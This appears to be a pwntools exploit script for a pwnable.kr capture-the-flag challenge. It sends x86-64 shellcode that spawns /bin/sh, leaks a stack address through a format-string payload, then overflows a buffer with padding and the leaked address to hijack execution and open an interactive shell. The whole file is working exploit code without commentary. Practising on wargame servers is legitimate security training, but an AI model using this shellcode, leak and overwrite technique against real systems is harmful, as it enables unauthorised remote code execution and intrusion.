from pwn import *
#context.log_level = 'debug'
target = remote('pwnable.kr',9011)
target.recvuntil('name? :')
shellcode = ''
shellcode = "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56"
shellcode += "\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"
#shellcode = "\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f"
#shellcode += "\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05"
target.sendline(shellcode)
target.recvuntil('>')
target.sendline('2')
payload = '%9$p'
target.sendline(payload)
target.recvline()
addr_name = int(target.recvline(),16) - 0x20
print hex(addr_name)
target.sendline('4')
target.sendline('n')
target.sendline('3')
payload = 'A' * 24 + p64(addr_name)
target.sendline(payload)
target.interactive()
